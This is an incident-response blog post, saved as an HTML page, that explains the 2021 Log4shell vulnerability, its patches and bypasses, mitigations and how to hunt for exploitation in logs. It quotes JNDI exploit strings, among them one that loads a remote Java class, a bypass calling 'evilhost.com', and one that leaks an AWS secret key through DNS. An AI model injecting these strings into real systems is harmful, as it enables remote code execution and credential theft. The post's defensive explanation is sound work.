@@ -1,0 +1,263 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content="Juho Jauhiainen ">
+<meta name=description content="Image source: Kevin Beaumont, Twitter
+ On Friday 10th of December 2021, internet was set on fire. Or technically internet was full of flammable material and someone shared matches to everyone on that day. In this blog post, I will present my thoughts about the case.
+ TL;DR  Do not flame the developers of Log4j or open-source stuff in general for this issue Always use the newest version of Log4j  If patching or mitigating is not possible in short term, organizations should consider taking down the vulnerable service until it has been fixed   Use default deny outbound Assume breach Happy hunting!">
+<meta name=keywords content="dfir forensics malware">
+<meta name=robots content="noodp">
+<meta name=theme-color content>
+<link rel=canonical href=https://blog.dfir.fi/posts/2021/12/0x08-log4shell-memos/>
+<title>
+[0x08] Log4shell memos :: DFIR ≫ Blog by whois
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=https://blog.dfir.fi/main.edb08d9474e18f675672f6f7b3debc9342ee3f0cb88e9fb4079620d09c53b30c.css>
+<link rel=apple-touch-icon sizes=180x180 href=https://blog.dfir.fi/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://blog.dfir.fi/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=https://blog.dfir.fi/favicon-16x16.png>
+<link rel=manifest href=https://blog.dfir.fi/site.webmanifest>
+<link rel=mask-icon href=https://blog.dfir.fi/safari-pinned-tab.svg color=#1b1c1d>
+<link rel="shortcut icon" href=https://blog.dfir.fi/favicon.ico>
+<meta name=msapplication-TileColor content="#1b1c1d">
+<meta name=theme-color content="#1b1c1d">
+<meta itemprop=name content="[0x08] Log4shell memos">
+<meta itemprop=description content="Image source: Kevin Beaumont, Twitter
+ On Friday 10th of December 2021, internet was set on fire. Or technically internet was full of flammable material and someone shared matches to everyone on that day. In this blog post, I will present my thoughts about the case.
+ TL;DR  Do not flame the developers of Log4j or open-source stuff in general for this issue Always use the newest version of Log4j  If patching or mitigating is not possible in short term, organizations should consider taking down the vulnerable service until it has been fixed   Use default deny outbound Assume breach Happy hunting!"><meta itemprop=datePublished content="2021-12-18T14:21:00+00:00">
+<meta itemprop=dateModified content="2021-12-18T14:21:00+00:00">
+<meta itemprop=wordCount content="2022"><meta itemprop=image content="https://blog.dfir.fi">
+<meta itemprop=keywords content>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://blog.dfir.fi">
+<meta name=twitter:title content="[0x08] Log4shell memos">
+<meta name=twitter:description content="Image source: Kevin Beaumont, Twitter
+ On Friday 10th of December 2021, internet was set on fire. Or technically internet was full of flammable material and someone shared matches to everyone on that day. In this blog post, I will present my thoughts about the case.
+ TL;DR  Do not flame the developers of Log4j or open-source stuff in general for this issue Always use the newest version of Log4j  If patching or mitigating is not possible in short term, organizations should consider taking down the vulnerable service until it has been fixed   Use default deny outbound Assume breach Happy hunting!">
+<meta property="og:title" content="[0x08] Log4shell memos">
+<meta property="og:description" content="Image source: Kevin Beaumont, Twitter
+ On Friday 10th of December 2021, internet was set on fire. Or technically internet was full of flammable material and someone shared matches to everyone on that day. In this blog post, I will present my thoughts about the case.
+ TL;DR  Do not flame the developers of Log4j or open-source stuff in general for this issue Always use the newest version of Log4j  If patching or mitigating is not possible in short term, organizations should consider taking down the vulnerable service until it has been fixed   Use default deny outbound Assume breach Happy hunting!">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://blog.dfir.fi/posts/2021/12/0x08-log4shell-memos/"><meta property="og:image" content="https://blog.dfir.fi"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-12-18T14:21:00+00:00">
+<meta property="article:modified_time" content="2021-12-18T14:21:00+00:00">
+<meta property="article:section" content="vulnerability">
+<meta property="article:section" content="exploitation">
+<meta property="article:published_time" content="2021-12-18 14:21:00 +0000 UTC">
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-138581360-1','auto'),ga('send','pageview'))</script>
+</head>
+<body>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=https://blog.dfir.fi/ style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>></span>
+<span class=logo__text>$ cd /cases/</span>
+<span class=logo__cursor style=background-color:#0047ab>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=https://blog.dfir.fi/about/>Author</a></li><li><a href=https://blog.dfir.fi/posts/>Blog</a></li><li><a href=https://dfir.fi>DFIR</a></li><li><a href=https://csoc.fi>SOC</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<main class=post>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+10 minutes
+</p>
+</div>
+<article>
+<h1 class=post-title>
+<a href=https://blog.dfir.fi/posts/2021/12/0x08-log4shell-memos/>[0x08] Log4shell memos</a>
+</h1>
+<div class=post-content>
+<p><img src=https://blog.dfir.fi/assets/images/log4shell.jpg alt="Log4shell logo">
+Image source: <a href="https://twitter.com/GossiTheDog/status/1469252646745874435?s=20">Kevin Beaumont, Twitter</a></p>
+<blockquote>
+<p>On Friday 10th of December 2021, internet was set on fire. Or technically internet was full of flammable material and someone shared matches to everyone on that day. In this blog post, I will present my thoughts about the case.</p>
+</blockquote>
+<h2 id=tldr>TL;DR</h2>
+<ul>
+<li>Do not flame the developers of Log4j or open-source stuff in general for this issue</li>
+<li>Always use the newest version of Log4j
+<ul>
+<li>If patching or mitigating is not possible in short term, organizations should consider taking down the vulnerable service until it has been fixed</li>
+</ul>
+</li>
+<li>Use default deny outbound</li>
+<li>Assume breach</li>
+<li>Happy hunting!</li>
+</ul>
+<h2 id=whats-log4shell-and-why-everyone-is-buzzing-about-it->What&rsquo;s Log4shell and why everyone is buzzing about it ?</h2>
+<p>Log4shell is a vulnerability found from versions 2.X of Log4j. The vulnerability is easy to exploit and allows an attacker to run their own code in the target system (Remote Code Execution, RCE). The seriousness of the Log4shell vulnerability cannot be exaggerated.</p>
+<p>Log4j is an open-source component, which is widely used in different applications, including commercial products. Log4j is written in Java and is mainly used in Java applications. Log4j is <em>mainly</em> used in backend components which means fixing the problem does not require actions from users. As described, the component is widely used. Based on unverified sources, few examples of vulnerable services are <a href="https://twitter.com/chvancooten/status/1469340927923826691?s=20">Apple</a>, <a href=https://github.com/YfryTchsGD/Log4jAttackSurface/blob/master/pages/Tesla.md>Tesla</a>, and <a href=https://github.com/YfryTchsGD/Log4jAttackSurface/blob/master/pages/Twitter.md>Twitter</a>, which describes the scale of the problem pretty good.</p>
+<blockquote class=twitter-tweet><p lang=en dir=ltr>A story in three parts 😶 <a href="https://twitter.com/hashtag/log4j?src=hash&ref_src=twsrc%5Etfw">#log4j</a> <a href=https://t.co/XMl02BcaJY>pic.twitter.com/XMl02BcaJY</a></p>&mdash; Cas van Cooten (@chvancooten) <a href="https://twitter.com/chvancooten/status/1469340927923826691?ref_src=twsrc%5Etfw">December 10, 2021</a></blockquote>
+<script async src=https://platform.twitter.com/widgets.js></script>
+<p>All admins and information security professionals have been busy for the past week but I can&rsquo;t even imagine how the week has been in the Log4j developer community. My warmest thoughts to you folks! I hope that this vulnerability reminds companies who use open-source code in their commercial products that they should also support these open-source projects financially.</p>
+<h2 id=how-to-know-if-this-affects-me>How to know if this affects me?</h2>
+<p>As a user, there&rsquo;s no easy way to find it out. In this case it&rsquo;s best to trust your service provider, which is of course not optimal. Many bounty hunters and white hat hackers are trying to inject the exploit code everywhere to find out which services are vulnerable. At the moment internet is full of exploitation attempts and it&rsquo;s impossible to say which are attempts are malicious and not.</p>
+<p>As an organization, try to find Log4j installations from your infra. And check this <a href=https://github.com/NCSC-NL/log4shell/tree/main/software>list by NCSC-NL</a> to check status of the products you use!</p>
+<p>As a side note, many forensics and blue team tools have been identified or rumored to be vulnerable. These tools include Carbon Black, Splunk, IBM Qradar, Autopsy, and Cellebrite. Imagine investigating evidence that contains the exploitation code and your forensic environment allows malicious actor in. This is good reminder why you should always do forensics without and internet access.</p>
+<h2 id=the-vulnerability>The vulnerability</h2>
+<p>The vulnerability is consequence of three different features or vulnerabilities in the Log4j:</p>
+<ol>
+<li>
+<p>Root cause of the vulnerability is lack of improper input validation (CWE-20). Basically user can input any string to the application and if the application is set to log for example requested URIs, the URI will end up to Log4j logger without any sanitation.</p>
+</li>
+<li>
+<p>The Log4j happens to have lookup feature (yes, it&rsquo;s a feature introduced in version log4j-2.0-beta9), which allows requesting variables from the system running the Log4j component. This feature can be called from Log4j using <code>${variable_here}</code> You can request for example username on a Linux system by providing string <code>${env:USER}</code> to Log4j and it will log the username from environment variable user and the value is the running the application.</p>
+</li>
+<li>
+<p>Now we get to the interesting part&mldr; :D Java runtime has a <a href=https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface>Java Naming and Directory Interface (JNDI)</a> which can be used to discover and look up data from remote endpoints. This feature can be called from Log4j by using the lookup method and adding <code>jndi</code> string to the lookup command: <code>${jndi:method:remoteaddress}</code>. JNDI allows multiple methods for the look up: LDAP, DNS, NIS, NDS, RMI, and CORBA, which means we can use any of these methods to look up more data from a remote endpoint.</p>
+</li>
+</ol>
+<p>If we would host our malicious Java class in <code>example.dfir.fi:4444/legit</code>, our exploitation string would be <code>${jndi:ldap:example.dfir.fi:4444/legit}</code>. Inputting this string to vulnerable application would cause the server to look up and execute our Java class hosted on our server.</p>
+<p>If you are more interested how the vulnerability works, I suggest you to read <a href=https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/>this write-up by Paul Ducklin</a> of Sophos.</p>
+<h2 id=version-confusion-and-fixing-the-vulnerability>Version confusion and fixing the vulnerability</h2>
+<p>First of all, I&rsquo;ve seen a lot arguments that &ldquo;we are not vulnerable as we use Log4j 1.X&rdquo;. This is true <em>when we talk about Log4shell</em> as Log4j 1.X is not vulnerable to this issue. Log4j 1.X however has many other issues, like CVE-2019-178571 in versions 1.2.X. CVE-2019-17571 has also <a href=https://0xsapra.github.io/website/CVE-2019-17571>public PoC</a>.</p>
+<blockquote class=twitter-tweet><p lang=en dir=ltr>If you already upgraded code to use just released log4j-2.15.0-rc1, it's still vulnerable - you now need to apply log4j-2.15.0-rc2 as there was a bypass. They is no stable release which fixes yet.</p>&mdash; Kevin Beaumont (@GossiTheDog) <a href="https://twitter.com/GossiTheDog/status/1469250605826850819?ref_src=twsrc%5Etfw">December 10, 2021</a></blockquote>
+<script async src=https://platform.twitter.com/widgets.js></script>
+<p>Log4j version 2.15.0 was released on 9th of December 2021 to fix the issue. The fix sets allowed LDAP hosts and java classes. Allowed LDAP hosts is set to prevent downloads from external sites and allowed java classes to prevent execution of malicious java classes. The version number is confusing as the version 2.15.0 was already released on 6th of December 2021. If you look inside the released version, you can see that the release tag inside <code>pom.xml</code> changed from release candidate 1 (rc1) to release candidate 2 (rc2). This means that the fix was actually in rc2 and if you downloaded the version 2.15.0 before the rc2 version was replaced in the product, you are still vulnerable to Log4shell.</p>
+<p><img src=https://blog.dfir.fi/assets/images/log4j-2.15.0.jpg alt=log4j-2.15.0></p>
+<p>Matthew Warner released a <a href=https://www.blumira.com/analysis-log4shell-local-trigger/>blog post in Blumira</a> on 16th of December explaining that the fixes in version 2.15.0 are not sufficient. Based on the blog post, fixes introduced in version 2.15.0 can be bypassed by using JavaScript. The introduced attack requires that the vulnerability service is running on a machine used to browse to a website that has malicious JavaScript running that starts to scan local service ports on the victim&rsquo;s machine. When these services are found, the scripts sends the exploit code to the service. This attack can be considered as a watering hole attack. As the vulnerable service would be running on the victim&rsquo;s machine, I don&rsquo;t see this attack vector super serious.</p>
+<p>On 13th of December, Apache released Log4j version 2.16.0. This version fixed the issue by disabling the JNDI by default. The version also removers support for Message Lookups. This version was released to fix RCE vulnerability CVE-2021-45046. This vulnerability was found few days after the Log4shell vulnerability was released. Based on the Log4j documentation, the vulnerability affects all Log4j 2.X versions but requires use of non-default configuration (<code>Pattern Layout</code> with a <code>Context Lookup</code>). <a href="https://twitter.com/marcioalm/status/1471740771581652995?s=20">Márcio Almeida claimed on Twitter</a> that this is a bypass for Log4shell mitigation introduced in Log4j version 2.15.0. He claimed that <code>allowedLdapHost</code> restriction can be bypassed by using localhost and #-character in the LDAP query host. Turned out that the RCE works only when the vulnerable application is running on Unix (at least Mac OS X and FreeBSD) environment. This means that the CVE-2021-45046 can&rsquo;t be considered as bad as Log4shell because it&rsquo;s only considering Unix servers. It&rsquo;s likely that the <code>allowedClasses</code> restriction can still be bypassed by using legit class name but at the time of writing this blog post, there&rsquo;s no known way to download the class from remote endpoint (on version 2.15.0).</p>
+<blockquote class=twitter-tweet><p lang=en dir=ltr>FIX: Here is a PoC in how to bypass allowedLdapHost and allowedClasses checks in Log4J 2.15.0. to achieve RCE: ${jndi:ldap://127.0.0.1#evilhost.com:1389/a} and to bypass allowedClasses just choose a name for a class in the JDK. Deserialization will occur as usual. <a href="https://twitter.com/hashtag/Log4Shell?src=hash&ref_src=twsrc%5Etfw">#Log4Shell</a> 1/n</p>&mdash; Márcio Almeida (@marcioalm) <a href="https://twitter.com/marcioalm/status/1471740771581652995?ref_src=twsrc%5Etfw">December 17, 2021</a></blockquote>
+<script async src=https://platform.twitter.com/widgets.js></script>
+<p>Today, on 18th of December, Apache released Log4j version 2.17.0. Based on the release table on Apache&rsquo;s website, it seems that the vulnerability was released in a hurry as the release date is formatted as <code>2021-MM-dd</code> (see the screenshot below). Once again, the version fixes a new vulnerability (CVE-2021-45105). In this case the vulnerability allows Denial-of-Service (DoS) on the vulnerable server. DoS vulnerabilities are not considered as severe as RCEs, as the vulnerability allows the attacker to affect only system availability. This vulnerability is similar to CVE-2021-45046 as it also non-default configurations from the system (<code>Pattern Layout</code> with a <code>Context Lookup</code>).</p>
+<p><img src=https://blog.dfir.fi/assets/images/log4j-2.17.0.png alt="U in hurry?"></p>
+<p>The best solution to fix Log4shell, is to update Log4j version to newest available, which was at the time of writing version 2.17.0. Based on the public information available at the moment, the first RCE safe version would be 2.16.0 at the moment.</p>
+<p>The issue can also be contained by using default deny outbound, e.q. restricting outbound connections from the server (egress rules). The egress rules contain RCE but the attack vector can still be used for data exfiltration, if the server can resolve domain names. For example if AWS secret keys are stored as an environment variable, it can be used as a subdomain and if an attacker has access to the name server of the used domain, they can see the query. This kind of attack could be achieved by injecting following string to vulnerable services:</p>
+<pre tabindex=0><code>${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.dfir.fi/log4j}
+</code></pre><p>Succesful mitigation of the vulnerability can be achieved by removing the vulnerable <code>JndiLookup</code> class from Log4j:</p>
+<pre tabindex=0><code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+</code></pre><h2 id=incident-response-tips>Incident response tips</h2>
+<p>The vulnerability was reported to Apache in November 2021 but it has been in Log4j since version 2.0-beta9, which was released 8 years ago. The vulnerability was released on 10th of December and since then the scanning has been super wild. Taking these premises into account, we should assume our vulnerable internet facing services have been breached.</p>
+<p>To start the investigation, you should take a look to logs. Look for any signs of the exploit string <code>${jndi:</code>. You should also note that latest exploitation attempts have been obfuscated for example to bypass WAF or to evade detection. To make the obfuscation easier, someone has released <a href=https://github.com/woodpecker-appstore/log4j-payload-generator>Log4j payload generator tool</a> on GitHub. As shown in the image below, the output of the tool can be pretty hardcore.</p>
+<p><img src=https://blog.dfir.fi/assets/images/little_obfuscation.png alt="Obfuscated payload"></p>
+<p><a href=https://github.com/Neo23x0/log4shell-detector>Florian Roth has also released a nice scanner</a> for Log4shell exploitation attempts. If you find exploitation attempts from access logs, please note that the HTTP code does not indicate if the exploitation was successful or not. The Log4j might log the requests whether the requested URI exists or not. It&rsquo;s also good to remind that you might not have all HTTP headers and POST payload stored anywhere, which makes detecting the issue and investigating the incident much harder. Thankfully all incident responders have already used to lack of visibility.</p>
+<p>After locating the exploitation, you should examine what it does and where it tries to fetch the payload. When you know where the payload is downloaded from, check the firewall logs if you can confirm if the download was successfully. Next see where the payload is written. I know there has been a lot Mushtik and Kinsing distributed using the Log4shell. Both of them use cron for persistence so you should check cronjobs running on the system. I wouldn&rsquo;t consider these payloads as severe threat for organization but I would be worried if there was anything else than these or a coin miner.</p>
+<p>Based on the <a href=https://www.advintel.io/post/ransomware-advisory-log4shell-exploitation-for-initial-access-lateral-movement>AdvIntel blog post</a>, Conti ransomware also uses Log4shell for initial access and lateral movement. My bet is that in few weeks we see a bloom in ransomware cases that used Log4shell for the initial access. I am also certain that all logs regarding Log4j are not available to you in your SIEM. If you haven&rsquo;t started yet, now would be great time to start threat hunting and use successful Log4shell exploitation as your hypothesis.</p>
+<h2 id=disclaimer>Disclaimer</h2>
+<p>I did not go deep into the different Java versions. Some of the vulnerabilities and fixes require correct version Java. Also please note that these are my personal memos of the issue. Please also note that I&rsquo;ve zero experience in developing Java and this blog post is written based on the information publicly available on 18th of December 2021.</p>
+</div>
+</article>
+<hr>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+<span class=tag><a href=https://blog.dfir.fi/categories/vulnerability/>vulnerability</a></span>
+<span class=tag><a href=https://blog.dfir.fi/categories/exploitation/>exploitation</a></span>
+</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+2022 Words
+</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+2021-12-18 14:21
+</p>
+</div>
+<hr>
+<div class=sharing-buttons>
+<a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f" target=_blank rel=noopener aria-label title="Share on facebook">
+<div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f" target=_blank rel=noopener aria-label title="Share on twitter">
+<div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&title=%5b0x08%5d%20Log4shell%20memos&caption=%5b0x08%5d%20Log4shell%20memos&canonicalUrl=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f" target=_blank rel=noopener aria-label title="Share on tumblr">
+<div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="mailto:?subject=%5b0x08%5d%20Log4shell%20memos&body=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f" target=_self rel=noopener aria-label title="Share via email">
+<div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f&media=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f;description=%5b0x08%5d%20Log4shell%20memos" target=_blank rel=noopener aria-label title="Share on pinterest">
+<div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f&title=%5b0x08%5d%20Log4shell%20memos&summary=%5b0x08%5d%20Log4shell%20memos&source=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f" target=_blank rel=noopener aria-label title="Share on linkedin">
+<div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f&resubmit=true&title=%5b0x08%5d%20Log4shell%20memos" target=_blank rel=noopener aria-label title="Share on reddit">
+<div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f;title=%5b0x08%5d%20Log4shell%20memos" target=_blank rel=noopener aria-label title="Share on xing">
+<div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="whatsapp://send?text=%5b0x08%5d%20Log4shell%20memos%20https%3a%2f%2fblog.dfir.fi%2fposts%2f2021%2f12%2f0x08-log4shell-memos%2f" target=_blank rel=noopener aria-label title="Share on whatsapp">
